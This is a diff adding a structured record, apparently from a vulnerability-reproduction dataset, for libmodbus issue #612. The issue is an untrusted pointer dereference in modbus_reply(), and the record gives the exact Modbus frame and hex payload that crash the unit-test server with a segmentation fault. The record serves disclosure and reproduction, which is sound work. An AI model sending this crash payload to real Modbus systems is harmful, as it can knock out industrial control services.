@@ -1,0 +1,17 @@
+Number: 612
+
+Summarize:
+Issue #612 reports an untrusted pointer dereference in `modbus_reply()` at `modbus.c:1001`. No affected version is documented. The reported trigger is sending a specific Modbus request frame to the test server built from `libmodbus/tests/unit-test-server.c`. The observed result is that `./unit-test-server` crashes with `SIGSEGV`/a segmentation fault instead of handling the request without crashing.
+
+Reproduce:
+1. Use the test server from `libmodbus/tests/unit-test-server.c` and run it as `./unit-test-server`.
+2. Connect from `127.0.0.1` and send this frame to the server:
+   `<03><DD><00><00><00><0D><FF><17><01><62><00><01><00><6A><00><01><02><D7><11>`
+3. With debug mode enabled, the reported output is:
+   - `The client connection from 127.0.0.1 is accepted`
+   - `Waiting for an indication...`
+   - the same frame is printed
+4. Expected documented result: the process terminates with a segmentation fault, e.g. `Program received signal SIGSEGV, Segmentation fault.` / `[1] 961170 segmentation fault ./unit-test-server`.
+
+Payload:
+03 dd 00 00 00 0d ff 17 01 62 00 01 00 6a 00 01 02 d7 11
